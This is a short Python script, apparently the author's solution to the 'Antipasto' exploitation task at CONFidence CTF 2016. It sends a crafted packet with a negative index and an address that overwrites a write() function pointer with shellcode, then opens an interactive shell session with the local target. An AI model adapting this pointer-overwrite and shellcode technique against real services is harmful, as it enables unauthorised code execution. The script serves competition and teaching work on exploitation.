#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Filename:         exploit.py
# Author:           Mateusz Jurczyk
# Task:             Antipasto
# Competition:      CONFidence CTF 2016
# Category:         Software exploitation
# Scoring:          50 pts (easy)
# Number of solves: 5 out of 22 teams

import struct
import socket
import telnetlib

def main():
  # Connect to the service.
  s = socket.socket()
  s.connect(("127.0.0.1", 1337))

  # Send a packet resulting in overwriting the write() function pointer
  # with the shellcode address, and then invoking it.
  s.send(struct.pack("<ii", -85, 0x804A030) +\
         open("shellcode", "rb").read() +\
         "\0" * 10000)

  # Switch to interactive mode.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

if __name__ == "__main__":
  main()
